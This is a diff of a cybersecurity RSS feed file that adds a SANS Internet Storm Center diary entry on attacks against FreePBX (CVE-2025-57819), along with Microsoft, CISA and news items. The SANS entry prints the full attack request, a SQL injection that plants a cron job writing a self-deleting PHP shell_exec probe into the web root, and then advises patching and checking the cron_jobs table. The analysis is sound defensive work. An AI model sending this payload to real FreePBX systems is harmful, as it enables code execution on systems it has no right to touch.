@@ -1,5 +1,131 @@
 <?xml version='1.0' encoding='UTF-8'?>
-<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>RedKey RSS Feed</title><link>https://redkey.tech/feed.xml</link><description>All The Cyber Things.</description><atom:link href="https://redkey.tech/feed.xml" rel="self"/><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><language>en</language><lastBuildDate>Tue, 07 Oct 2025 15:59:17 +0000</lastBuildDate><item><title>Infocon: green</title><link>https://isc.sans.edu/diary.html?rss</link><description>ISC Stormcast For Tuesday, October 7th, 2025 https://isc.sans.edu/podcastdetail/9644</description><guid isPermaLink="false">https://isc.sans.edu/diary.html?rss</guid></item><item><title>CISA Releases Two Industrial Control Systems Advisories</title><link>https://www.cisa.gov/news-events/alerts/2025/10/07/cisa-releases-two-industrial-control-systems-advisories</link><description>&lt;p&gt;CISA released two Industrial Control Systems (ICS) advisories on October 7, 2025. These advisories provide timely information about current security issues, vulnerabilities, and exploits surrounding ICS.&lt;/p&gt;
+<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>RedKey RSS Feed</title><link>https://redkey.tech/feed.xml</link><description>All The Cyber Things.</description><atom:link href="https://redkey.tech/feed.xml" rel="self"/><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><language>en</language><lastBuildDate>Tue, 07 Oct 2025 16:59:20 +0000</lastBuildDate><item><title>Infocon: green</title><link>https://isc.sans.edu/diary.html?rss</link><description>Exploit Against FreePBX (CVE-2025-57819) with code execution.</description><guid isPermaLink="false">https://isc.sans.edu/diary.html?rss</guid></item><item><title>Exploit Against FreePBX (CVE-2025-57819) with code execution., (Tue, Oct 7th)</title><link>https://isc.sans.edu/diary/rss/32350</link><description>&lt;p&gt;FreePBX is a popular PBX system built around the open source VoIP system Asterisk. To manage Asterisk more easily, it provides a capable web-based admin interface. Sadly, like so many web applications, it has had its share of vulnerabilities in the past. Most recently, a SQL injection vulnerability was found that allows attackers to modify the database.&lt;/p&gt;&amp;#xd;</description><content:encoded>&lt;p&gt;FreePBX is a popular PBX system built around the open source VoIP system Asterisk. To manage Asterisk more easily, it provides a capable web-based admin interface. Sadly, like so many web applications, it has had its share of vulnerabilities in the past. Most recently, a SQL injection vulnerability was found that allows attackers to modify the database.&lt;/p&gt;
+
+&lt;p&gt;For a PBX, there are a number of obvious attacks. For example, they are often abused for free phone calls, to impersonate the companies running the PBX, or to hide the true origin of phone calls. Manipulating the FreePBX database would certainly facilitate these types of attacks. However, I noticed some slightly more interesting attacks recently attempting to achieve complete code execution.&lt;/p&gt;
+
+&lt;p&gt;A typical request looks like:&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;&lt;tt&gt;GET&amp;nbsp;/admin/ajax.php?module=FreePBX\modules\endpoint\ajax&amp;amp;command=model&amp;amp;template=x&amp;amp;model=model&amp;amp;brand=x' ;INSERT INTO cron_jobs (modulename,jobname,command,class,schedule,max_runtime,enabled,execution_order) VALUES ('sysadmin','takdak','echo &amp;quot;PD9waHAgaGVhZGVyKCd4X3BvYzogQ1ZFLTIwMjUtNTc4MTknKTsgZWNobyBzaGVsbF9leGVjKCd1bmFtZSAtYScpOyB1bmxpbmsoX19GSUxFX18pOyA/Pgo=&amp;quot;|base64 -d &amp;gt;/var/www/html/rspgf.php',NULL,'* * * * *',30,1,1) --&lt;/tt&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;The &amp;quot;brand&amp;quot; parameter is used for the SQL injection, and the parameter decodes to:&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;&lt;tt&gt;&amp;nbsp;;INSERT INTO cron_jobs (modulename,jobname,command,class,schedule,max_runtime,enabled,execution_order) VALUES ('sysadmin','takdak','echo &amp;quot;PD9waHAgaGVhZGVyKCd4X3BvYzogQ1ZFLTIwMjUtNTc4MTknKTsgZWNobyBzaGVsbF9leGVjKCd1bmFtZSAtYScpOyB1bmxpbmsoX19GSUxFX18pOyA/Pgo=&amp;quot;|base64 -d &amp;gt;/var/www/html/rspgf.php',NULL,'* * * * *',30,1,1) --&lt;/tt&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;FreePBX uses the &amp;quot;cron_jobs&amp;quot; database to assist in the management of cron jobs. Inserting a line into the table results in simple, arbitrary code execution. The command injected creates a file /var/www/html/rspgf.php, with the following content:&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;&lt;tt&gt;&amp;lt;?php header('x_poc: CVE-2025-57819'); echo shell_exec('uname -a'); unlink(__FILE__); ?&amp;gt;&lt;/tt&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;So, a simple test to see if the system is vulnerable. Interestingly, the file deletes itself after being accessed by the attacker. The cron job should persist and re-create the file every minute, which makes the &amp;quot;unlink&amp;quot; kind of pointless. I do not see any hits in our honeypot for this file. Reviewing the cron_jobs table should be another good way to find similar exploits.&lt;/p&gt;
+
+&lt;p&gt;Please make sure your FreePBX instance is up to date. The vulnerability was initially made public on August 28th [1], and was already exploited at the time.&lt;/p&gt;
+
+&lt;p&gt;[1]&amp;nbsp;https://community.freepbx.org/t/security-advisory-please-lock-down-your-administrator-access/107203&lt;/p&gt;
+
+&lt;p&gt;&amp;nbsp;&lt;/p&gt;
+
+&lt;p&gt;--&lt;br /&gt;
+Johannes B. Ullrich, Ph.D. , Dean of Research, &lt;a href="https://sans.edu"&gt;SANS.edu&lt;/a&gt;&lt;br /&gt;
+&lt;a href="https://jbu.me/164"&gt;Twitter&lt;/a&gt;|&lt;/p&gt;
+
+&lt;p&gt;&amp;nbsp;&lt;/p&gt;
+
+ 
+ (c) SANS Internet Storm Center. https://isc.sans.edu Creative Commons Attribution-Noncommercial 3.0 United States License.</content:encoded><guid isPermaLink="false">https://isc.sans.edu/diary/rss/32350</guid></item><item><title>New Microsoft Secure Future Initiative (SFI) patterns and practices: Practical guides to strengthen security</title><link>https://www.microsoft.com/en-us/security/blog/2025/10/07/new-microsoft-secure-future-initiative-sfi-patterns-and-practices-practical-guides-to-strengthen-security/</link><description>&lt;p&gt;Microsoft Secure Future Initiative (SFI) patterns and practices are practical, actionable, insights from practitioners for practitioners based on Microsoft’s implementation of Zero Trust through the Microsoft Secure Future Initiatives. By adopting these patterns, organizations can accelerate their security maturity, reduce implementation friction, and build systems that are more secure by design, default, and in operation.  ​&lt;/p&gt;
+&lt;p&gt;The post &lt;a href="https://www.microsoft.com/en-us/security/blog/2025/10/07/new-microsoft-secure-future-initiative-sfi-patterns-and-practices-practical-guides-to-strengthen-security/"&gt;New Microsoft Secure Future Initiative (SFI) patterns and practices: Practical guides to strengthen security&lt;/a&gt; appeared first on &lt;a href="https://www.microsoft.com/en-us/security/blog"&gt;Microsoft Security Blog&lt;/a&gt;.&lt;/p&gt;</description><content:encoded>&lt;p class="wp-block-paragraph"&gt;Building on the momentum of our initial launch of the &lt;a href="https://www.microsoft.com/security/blog/2025/08/06/sharing-practical-guidance-launching-microsoft-secure-future-initiative-sfi-patterns-and-practices/"&gt;Microsoft Secure Future Initiative (SFI) patterns and practices&lt;/a&gt;, this second installment continues our commitment to making security implementation practical and scalable. The first release introduced a foundational library of actionable guidance rooted in proven &lt;a href="https://www.microsoft.com/en-us/security/business/zero-trust" rel="noreferrer noopener" target="_blank"&gt;architectures like Zero Trust&lt;/a&gt;. Now, we’re expanding that guidance with new examples that reflect our ongoing learnings—helping customers and partners understand our strategic approach more deeply and apply it effectively in their own environments.&lt;/p&gt;
+
+
+
+&lt;div class="wp-block-buttons is-content-justification-center is-layout-flex wp-container-core-buttons-is-layout-1 wp-block-buttons-is-layout-flex"&gt;
+&lt;div class="wp-block-button"&gt;&lt;a class="wp-block-button__link wp-element-button" href="https://www.microsoft.com/en-us/trust-center/security/secure-future-initiative"&gt;Discover more about the Microsoft Secure Future Initiative&lt;/a&gt;&lt;/div&gt;
+&lt;/div&gt;
+
+
+
+&lt;p class="wp-block-paragraph"&gt;This next set of SFI patterns and practices articles include practical, actionable guidance built by practitioners, for practitioners, in the areas of network, engineering systems, and security response. Each of the six articles includes details on how Microsoft has improved our security posture in each area so customers, partners, and the broader security community can do the same.&lt;/p&gt;
+
+
+
+&lt;p class="wp-block-paragraph"&gt;  &lt;/p&gt;
+
+
+
+&lt;figure class="wp-block-table"&gt;&lt;table class="has-fixed-layout"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td&gt;&lt;strong&gt;Pattern name&lt;/strong&gt; &lt;/td&gt;&lt;td&gt;&lt;strong&gt;SFI Pillar&lt;/strong&gt; &lt;/td&gt;&lt;td&gt;&lt;strong&gt;What it helps you do &lt;/strong&gt; &lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;a href="https://aka.ms/SFI_NetworkIsolation" rel="noreferrer noopener" target="_blank"&gt;&lt;strong&gt;Network isolation&lt;/strong&gt;&lt;/a&gt;&lt;strong&gt; &lt;/strong&gt; &lt;/td&gt;&lt;td&gt;Protect networks &lt;/td&gt;&lt;td&gt;Contain breaches by default. Strongly segment and isolate your network (through per-service ACLs, isolated virtual networks, and more) to prevent lateral movement and limit cyberattackers if they get in.&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;a href="https://aka.ms/SFI_SecureAllTenantsAndResources" rel="noreferrer noopener" target="_blank"&gt;&lt;strong&gt;Secure all tenants and their resources&lt;/strong&gt;&lt;/a&gt;&lt;strong&gt; &lt;/strong&gt; &lt;/td&gt;&lt;td&gt;Protect tenants and isolate systems &lt;/td&gt;&lt;td&gt;Help eliminate “shadow” tenants. Apply baseline security policies, such as multifactor authentication (MFA), Conditional Access, and more, to every cloud tenant and retire unused ones, so cyberattackers can’t exploit forgotten, weakly-secured environments.&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;a href="https://aka.ms/SFI_HigherSecurityEntraIDApps" rel="noreferrer noopener" target="_blank"&gt;&lt;strong&gt;Higher security for Entra ID apps&lt;/strong&gt;&lt;/a&gt;&lt;strong&gt; &lt;/strong&gt; &lt;/td&gt;&lt;td&gt;Protect tenants and isolate systems &lt;/td&gt;&lt;td&gt;Close identity backdoors. Enforce high security standards for all Microsoft Entra ID (Azure AD) applications—removing unused apps, tightening permissions, and requiring strong authorization—to block common misconfigurations cyberattackers abuse for cross-tenant attacks.&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;a href="https://aka.ms/SFI_ZeroTrustSourceCodeAccess" rel="noreferrer noopener" target="_blank"&gt;&lt;strong&gt;Zero Trust for source code access&lt;/strong&gt;&lt;/a&gt;&lt;strong&gt; &lt;/strong&gt; &lt;/td&gt;&lt;td&gt;Protecting engineering systems &lt;/td&gt;&lt;td&gt;Secure the dev pipeline. Require proof-of-presence MFA for critical code commits and merges to help ensure only verified developers can push code and stop cyberattackers from surreptitiously injecting changes.&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;a href="https://aka.ms/SFI_ProtectSoftwareSupplyChain" rel="noreferrer noopener" target="_blank"&gt;&lt;strong&gt;Protect the software supply chain&lt;/strong&gt;&lt;/a&gt;&lt;strong&gt; &lt;/strong&gt; &lt;/td&gt;&lt;td&gt;Protecting engineering systems &lt;/td&gt;&lt;td&gt;Lock down builds and dependencies. Govern your continuous integration and continuous delivery (CI/CD) pipelines and package management—use standardized build templates, internal package feeds, and automated scanning to block supply chain cyberattacks before they reach production.&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;a href="https://aka.ms/SFI_CentralizeAccessToSecurityLogs" rel="noreferrer noopener" target="_blank"&gt;&lt;strong&gt;Centralize access to security logs&lt;/strong&gt;&lt;/a&gt;&lt;strong&gt; &lt;/strong&gt; &lt;/td&gt;&lt;td&gt;Monitoring and detecting threats &lt;/td&gt;&lt;td&gt;Speed up investigations. Standardize and centralize your log collection (with longer retention) so that security teams have unified visibility and can detect and investigate incidents faster—even across complex, multi-cloud environments.   &lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;
+
+
+
+&lt;h2 class="wp-block-heading" id="more-about-sfi-patterns-and-practices"&gt;&lt;strong&gt;More about SFI patterns and practices&lt;/strong&gt; &lt;/h2&gt;
+
+
+
+&lt;p class="wp-block-paragraph"&gt;Just as software design patterns provide reusable solutions to common engineering problems, SFI patterns and practices offer repeatable, proven approaches to solving complex cybersecurity challenges. Each pattern is crafted to address a specific security risk—legacy infrastructure or inconsistent CI/CD pipelines—and is grounded in Microsoft’s own experience. Like design patterns in software architecture, these security patterns are modular, extensible, and built for reuse across diverse environments.&lt;/p&gt;
+
+
+
+&lt;p class="wp-block-paragraph"&gt;Additionally, each pattern in the SFI patterns and practices library follows a consistent and purposeful structure. Every article begins with a &lt;strong&gt;pattern name&lt;/strong&gt;—a concise handle that captures the essence of the cybersecurity challenge. The &lt;strong&gt;problem&lt;/strong&gt; section outlines the security risk and its real-world context, helping readers understand why it matters. The &lt;strong&gt;solution&lt;/strong&gt; describes how Microsoft addressed the issue internally. The &lt;strong&gt;guidance&lt;/strong&gt; section provides practical recommendations that customers can consider applying in their own environments. Finally, the &lt;strong&gt;implications&lt;/strong&gt; section outlines the outcomes and trade-offs of implementing the pattern, helping organizations anticipate both the benefits and the operational considerations.&lt;/p&gt;
+
+
+
+&lt;p class="wp-block-paragraph"&gt;This structure offers a framework for understanding, applying, and evolving security practices. &lt;/p&gt;
+
+
+&lt;div class="wp-block-embed__wrapper"&gt;
+			&lt;div class="ms-metrics-youtube-container" id="ms-metrics-youtube-68e53c9d83e15"&gt;
+				&lt;div class="ms-metrics-youtube-player"&gt;&lt;/div&gt;
+			&lt;/div&gt;
+		&lt;/div&gt;
+
+
+&lt;h2 class="wp-block-heading" id="next-steps-with-the-secure-future"&gt;Next steps with SFI&lt;/h2&gt;
+
+
+
+&lt;div class="alignright wp-block-bloginabox-theme-kicker"&gt;
+	&lt;div class="kicker"&gt;
+		&lt;h2 class="kicker__title"&gt;
+			April 2025 progress Report		&lt;/h2&gt;
+		&lt;p class="kicker__content"&gt;
+							&lt;a class="kicker__link" href="https://cdn-dynmedia-1.microsoft.com/is/content/microsoftcorp/microsoft/final/en-us/microsoft-brand/documents/sfi-april-2025-progress-report.pdf" rel="noopener noreferrer" target="_blank"&gt;
+						Read the report							↗&lt;/a&gt;
+					&lt;/p&gt;
+	&lt;/div&gt;
+&lt;/div&gt;
+
+
+
+&lt;p class="wp-block-paragraph"&gt;Security is a journey, and Microsoft is committed to sharing our insights from SFI. Watch for more actionable advice in coming months. SFI patterns and practices provide a roadmap for putting secure architecture into practice. Embracing these approaches enables organizations to advance their security posture, minimize deployment hurdles, and establish environments that are secure by design, by default, and in operations. &lt;/p&gt;
+
+
+
+&lt;p class="wp-block-paragraph"&gt;To get access to the full library, visit our new &lt;a href="https://aka.ms/SFI_PatternsAndPracticesPage" rel="noreferrer noopener" target="_blank"&gt;SFI patterns and practices&lt;/a&gt; webpage. And check out the new &lt;a href="https://www.microsoft.com/trust-center/security/secure-future-initiative" rel="noreferrer noopener" target="_blank"&gt;SFI video on our redesigned website&lt;/a&gt; to hear directly from Microsoft leadership about how we are putting &lt;strong&gt;security above all else&lt;/strong&gt;.&lt;/p&gt;
+
+
+
+&lt;h2 class="wp-block-heading" id="let-s-build-a-secure-future-together"&gt;&lt;strong&gt;Let’s build a secure future, together &lt;/strong&gt;&lt;/h2&gt;
+
+
+
+&lt;p class="wp-block-paragraph"&gt;Talk to your Microsoft account team to integrate these practices into your roadmap. &lt;/p&gt;
+
+
+
+&lt;div class="wp-block-buttons is-content-justification-center is-layout-flex wp-container-core-buttons-is-layout-2 wp-block-buttons-is-layout-flex"&gt;
+&lt;div class="wp-block-button"&gt;&lt;a class="wp-block-button__link wp-element-button" href="https://www.microsoft.com/en-us/trust-center/security/secure-future-initiative"&gt;Keep up to date with all the SFI updates&lt;/a&gt;&lt;/div&gt;
+&lt;/div&gt;
+
+
+
+&lt;p class="wp-block-paragraph"&gt;To learn more about Microsoft Security solutions, visit our &lt;a href="https://www.microsoft.com/en-us/security/business" rel="noreferrer noopener" target="_blank"&gt;website.&lt;/a&gt; Bookmark the &lt;a href="https://www.microsoft.com/security/blog/" rel="noreferrer noopener" target="_blank"&gt;Security blog&lt;/a&gt; to keep up with our expert coverage on security matters. Also, follow us on LinkedIn (&lt;a href="https://www.linkedin.com/showcase/microsoft-security/" rel="noreferrer noopener" target="_blank"&gt;Microsoft Security&lt;/a&gt;) and&amp;nbsp;X&amp;nbsp;(&lt;a href="https://twitter.com/@MSFTSecurity" rel="noreferrer noopener" target="_blank"&gt;@MSFTSecurity&lt;/a&gt;) for the latest news and updates on cybersecurity.&amp;nbsp;&lt;/p&gt;
+
+
+
+&lt;p class="wp-block-paragraph"&gt;&lt;/p&gt;
+&lt;p&gt;The post &lt;a href="https://www.microsoft.com/en-us/security/blog/2025/10/07/new-microsoft-secure-future-initiative-sfi-patterns-and-practices-practical-guides-to-strengthen-security/"&gt;New Microsoft Secure Future Initiative (SFI) patterns and practices: Practical guides to strengthen security&lt;/a&gt; appeared first on &lt;a href="https://www.microsoft.com/en-us/security/blog"&gt;Microsoft Security Blog&lt;/a&gt;.&lt;/p&gt;</content:encoded><guid isPermaLink="false">https://www.microsoft.com/en-us/security/blog/?p=142521</guid></item><item><title>CISA Releases Two Industrial Control Systems Advisories</title><link>https://www.cisa.gov/news-events/alerts/2025/10/07/cisa-releases-two-industrial-control-systems-advisories</link><description>&lt;p&gt;CISA released two Industrial Control Systems (ICS) advisories on October 7, 2025. These advisories provide timely information about current security issues, vulnerabilities, and exploits surrounding ICS.&lt;/p&gt;
 &lt;ul&gt;
 &lt;li&gt;ICSA-25-280-01 &lt;a href="https://www.cisa.gov/news-events/ics-advisories/icsa-25-280-01" title="Delta Electronics DIAScreen"&gt;Delta Electronics DIAScreen&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;ICSA-25-226-31 &lt;a href="https://www.cisa.gov/news-events/ics-advisories/icsa-25-226-31" title="Rockwell Automation 1756-EN4TR, 1756-EN4TRXT (Update B)"&gt;Rockwell Automation 1756-EN4TR, 1756-EN4TRXT (Update B)&lt;/a&gt;&lt;/li&gt;
@@ -1015,7 +1141,7 @@ Johannes B. Ullrich, Ph.D. , Dean of Research, &lt;a href="https://sans.edu"&gt;
 
 
 
-&lt;div class="wp-block-buttons is-content-justification-center is-layout-flex wp-container-core-buttons-is-layout-1 wp-block-buttons-is-layout-flex"&gt;
+&lt;div class="wp-block-buttons is-content-justification-center is-layout-flex wp-container-core-buttons-is-layout-3 wp-block-buttons-is-layout-flex"&gt;
 &lt;div class="wp-block-button has-custom-width wp-block-button__width-75"&gt;&lt;a class="wp-block-button__link wp-element-button" href="https://www.microsoft.com/en-us/security/business/siem-and-xdr/microsoft-defender-xdr"&gt;Get incident-level visibility with Microsoft Defender XDR&lt;/a&gt;&lt;/div&gt;
 &lt;/div&gt;
 
@@ -1078,7 +1204,7 @@ Johannes B. Ullrich, Ph.D. , Dean of Research, &lt;a href="https://sans.edu"&gt;
 
 
 
-&lt;div class="wp-block-buttons is-content-justification-center is-layout-flex wp-container-core-buttons-is-layout-2 wp-block-buttons-is-layout-flex"&gt;
+&lt;div class="wp-block-buttons is-content-justification-center is-layout-flex wp-container-core-buttons-is-layout-4 wp-block-buttons-is-layout-flex"&gt;
 &lt;div class="wp-block-button has-custom-width wp-block-button__width-75"&gt;&lt;a class="wp-block-button__link wp-element-button" href="https://www.microsoft.com/en-us/security/business/siem-and-xdr/microsoft-defender-xdr"&gt;Take your SOC team to the next level with Microsoft Defender XDR&amp;nbsp;&lt;/a&gt;&lt;/div&gt;
 &lt;/div&gt;
 
@@ -1170,7 +1296,7 @@ Johannes B. Ullrich, Ph.D. , Dean of Research, &lt;a href="https://sans.edu"&gt;
 
 
 
-&lt;div class="wp-block-buttons is-content-justification-center is-layout-flex wp-container-core-buttons-is-layout-3 wp-block-buttons-is-layout-flex"&gt;
+&lt;div class="wp-block-buttons is-content-justification-center is-layout-flex wp-container-core-buttons-is-layout-5 wp-block-buttons-is-layout-flex"&gt;
 &lt;div class="wp-block-button has-custom-width wp-block-button__width-75"&gt;&lt;a class="wp-block-button__link wp-element-button" href="https://www.microsoft.com/en-us/security/business/cybersecurity-awareness"&gt;Explore Microsoft Cybersecurity Awareness resources&lt;/a&gt;&lt;/div&gt;
 &lt;/div&gt;
 
@@ -1313,7 +1439,7 @@ Johannes B. Ullrich, Ph.D. , Dean of Research, &lt;a href="https://sans.edu"&gt;
 
 
 
-&lt;div class="wp-block-buttons is-content-justification-center is-layout-flex wp-container-core-buttons-is-layout-4 wp-block-buttons-is-layout-flex"&gt;
+&lt;div class="wp-block-buttons is-content-justification-center is-layout-flex wp-container-core-buttons-is-layout-6 wp-block-buttons-is-layout-flex"&gt;
 &lt;div class="wp-block-button has-custom-width wp-block-button__width-50"&gt;&lt;a class="wp-block-button__link wp-element-button" href="https://aka.ms/becybersmartkit"&gt;Get the Be Cybersmart Kit&lt;/a&gt;&lt;/div&gt;
 &lt;/div&gt;
 
@@ -3221,7 +3347,7 @@ Johannes B. Ullrich, Ph.D. , Dean of Research, &lt;a href="https://sans.edu"&gt;
 
 
 
-&lt;div class="wp-block-buttons is-content-justification-center is-layout-flex wp-container-core-buttons-is-layout-5 wp-block-buttons-is-layout-flex"&gt;
+&lt;div class="wp-block-buttons is-content-justification-center is-layout-flex wp-container-core-buttons-is-layout-7 wp-block-buttons-is-layout-flex"&gt;
 &lt;div class="wp-block-button"&gt;&lt;a class="wp-block-button__link wp-element-button" href="https://www.microsoft.com/en-us/security/business/siem-and-xdr/microsoft-sentinel"&gt;Secure your multicloud, multiplatform environment with Microsoft Sentinel&lt;/a&gt;&lt;/div&gt;
 &lt;/div&gt;
 
@@ -3231,7 +3357,7 @@ Johannes B. Ullrich, Ph.D. , Dean of Research, &lt;a href="https://sans.edu"&gt;
 
 
 &lt;div class="wp-block-embed__wrapper"&gt;
-			&lt;div class="ms-metrics-youtube-container" id="ms-metrics-youtube-68e51eae8a93e"&gt;
+			&lt;div class="ms-metrics-youtube-container" id="ms-metrics-youtube-68e53c9da145a"&gt;
 				&lt;div class="ms-metrics-youtube-player"&gt;&lt;/div&gt;
 			&lt;/div&gt;
 		&lt;/div&gt;
@@ -3262,13 +3388,13 @@ Johannes B. Ullrich, Ph.D. , Dean of Research, &lt;a href="https://sans.edu"&gt;
 
 
 &lt;div class="wp-block-embed__wrapper"&gt;
-			&lt;div class="ms-metrics-youtube-container" id="ms-metrics-youtube-68e51eae8b179"&gt;
+			&lt;div class="ms-metrics-youtube-container" id="ms-metrics-youtube-68e53c9da47e3"&gt;
 				&lt;div class="ms-metrics-youtube-player"&gt;&lt;/div&gt;
 			&lt;/div&gt;
 		&lt;/div&gt;
 
 
-&lt;div class="wp-block-buttons is-content-justification-center is-layout-flex wp-container-core-buttons-is-layout-6 wp-block-buttons-is-layout-flex"&gt;
+&lt;div class="wp-block-buttons is-content-justification-center is-layout-flex wp-container-core-buttons-is-layout-8 wp-block-buttons-is-layout-flex"&gt;
 &lt;div class="wp-block-button"&gt;&lt;a class="wp-block-button__link wp-element-button" href="https://aka.ms/sentineldatalakedocs" rel="noreferrer noopener" target="_blank"&gt;Learn more about Microsoft Sentinel platform and take the next steps&lt;/a&gt;&lt;/div&gt;
 &lt;/div&gt;
 
@@ -3294,7 +3420,7 @@ Johannes B. Ullrich, Ph.D. , Dean of Research, &lt;a href="https://sans.edu"&gt;
 
 
 
-&lt;div class="wp-block-buttons is-content-justification-center is-layout-flex wp-container-core-buttons-is-layout-7 wp-block-buttons-is-layout-flex"&gt;
+&lt;div class="wp-block-buttons is-content-justification-center is-layout-flex wp-container-core-buttons-is-layout-9 wp-block-buttons-is-layout-flex"&gt;
 &lt;div class="wp-block-button"&gt;&lt;a class="wp-block-button__link wp-element-button" href="https://aka.ms/SCP-Secure-2509" rel="noreferrer noopener" target="_blank"&gt;Learn more about Security Copilot agents and explore what’s possible&lt;/a&gt;&lt;/div&gt;
 &lt;/div&gt;
 
@@ -3334,7 +3460,7 @@ Johannes B. Ullrich, Ph.D. , Dean of Research, &lt;a href="https://sans.edu"&gt;
 
 
 
-&lt;div class="wp-block-buttons is-content-justification-center is-layout-flex wp-container-core-buttons-is-layout-8 wp-block-buttons-is-layout-flex"&gt;
+&lt;div class="wp-block-buttons is-content-justification-center is-layout-flex wp-container-core-buttons-is-layout-10 wp-block-buttons-is-layout-flex"&gt;
 &lt;div class="wp-block-button"&gt;&lt;a class="wp-block-button__link wp-element-button" href="https://learn.microsoft.com/en-us/security/security-for-ai/" rel="noreferrer noopener" target="_blank"&gt;Learn more about end-to-end protection for your AI agents&lt;/a&gt;&lt;/div&gt;
 &lt;/div&gt;
 
@@ -3382,7 +3508,7 @@ Johannes B. Ullrich, Ph.D. , Dean of Research, &lt;a href="https://sans.edu"&gt;
 
 
 
-&lt;div class="wp-block-buttons is-content-justification-center is-layout-flex wp-container-core-buttons-is-layout-9 wp-block-buttons-is-layout-flex"&gt;
+&lt;div class="wp-block-buttons is-content-justification-center is-layout-flex wp-container-core-buttons-is-layout-11 wp-block-buttons-is-layout-flex"&gt;
 &lt;div class="wp-block-button has-custom-width wp-block-button__width-75"&gt;&lt;a class="wp-block-button__link wp-element-button" href="https://www.microsoft.com/en-us/security/business/siem-and-xdr/microsoft-sentinel"&gt;Secure more with Microsoft Sentinel&lt;/a&gt;&lt;/div&gt;
 &lt;/div&gt;
 
@@ -3420,7 +3546,7 @@ Johannes B. Ullrich, Ph.D. , Dean of Research, &lt;a href="https://sans.edu"&gt;
 &lt;/ul&gt;
 &lt;p&gt;CISA encourages users and administrators to review newly released ICS advisories for technical details and mitigations.&lt;/p&gt;</description><guid isPermaLink="false">/node/24034</guid></item><item><title>How to Use Passkeys With Google Password Manager (2025)</title><link>https://www.wired.com/story/how-to-use-google-passkeys/</link><description>Google can create and manage passkeys from your browser, but the process is more involved than it suggests.</description><guid isPermaLink="false">68c838f7bb9c33b2cc3dc7ba</guid><category>Gear</category><category>Gear / How To and Advice</category><category>Gear / Products / Online Services</category><category>Security / Security Advice</category><category>Shopping</category><category>how-to</category><category>Google</category><category>Chrome</category><category>privacy</category><category>security</category><category>Passwords</category><category>software</category><category>Brave New World</category></item><item><title>SMB Security Pack</title><link>https://www.techrepublic.com/resource-library/it-policy/smb-security-pack/</link><description>&lt;p&gt;Save $34 with this pack and boost your handling and knowledge of cybersecurity. Constantly Updated — The download contains the latest and most accurate details. Seven Assets — The bundle comprises seven documents: IT Staff Systems and Data Access Policy, Encryption Policy, IT Physical Security Policy, Security Response Policy, Password Management Policy, Electronic Communication Policy, ...&lt;/p&gt;
 &lt;p&gt;The post &lt;a href="https://www.techrepublic.com/resource-library/it-policy/smb-security-pack/"&gt;SMB Security Pack&lt;/a&gt; appeared first on &lt;a href="https://www.techrepublic.com"&gt;TechRepublic&lt;/a&gt;.&lt;/p&gt;</description><guid isPermaLink="false">https://www.techrepublic.com/resource-library/whitepapers/smb-security-pack/</guid><category>Cybersecurity</category><category>IT Resources</category></item><item><title>This $30 Subscription Will Bring AI Into Your Business</title><link>https://www.techrepublic.com/article/1minai-pro-plan-lifetime-subscription/</link><description>&lt;p&gt;Tap into the power of OpenAI, Meta, Midjourney, and additional powerful AI models with 1min.AI.&lt;/p&gt;
-&lt;p&gt;The post &lt;a href="https://www.techrepublic.com/article/1minai-pro-plan-lifetime-subscription/"&gt;This $30 Subscription Will Bring AI Into Your Business&lt;/a&gt; appeared first on &lt;a href="https://www.techrepublic.com"&gt;TechRepublic&lt;/a&gt;.&lt;/p&gt;</description><guid isPermaLink="false">https://www.techrepublic.com/?p=4248378</guid><category>Artificial Intelligence</category><category>Tech &amp; Work</category><category>TR Academy</category><category>1minai tool</category><category>artificial intelligence</category><category>artificial intelligence tool</category></item><item><title>ISC Stormcast For Tuesday, September 30th, 2025 https://isc.sans.edu/podcastdetail/9634, (Tue, Sep 30th)</title><link>https://isc.sans.edu/diary/rss/32332</link><description>(c) SANS Internet Storm Center. https://isc.sans.edu Creative Commons Attribution-Noncommercial 3.0 United States License.</description><content:encoded>(c) SANS Internet Storm Center. https://isc.sans.edu Creative Commons Attribution-Noncommercial 3.0 United States License.</content:encoded><guid isPermaLink="false">https://isc.sans.edu/diary/rss/32332</guid></item><item><title>Security Breaches Found in AI-Powered Repair Tool Wondershare RepairIt</title><link>https://www.techrepublic.com/article/repairit-security-breach/</link><description>&lt;p&gt;Trend Micro reveals that RepairIt "contradicted its privacy policy by collecting, storing, and, due to weak Development, Security, and Operations practices, inadvertently leaking private user data."&lt;/p&gt;
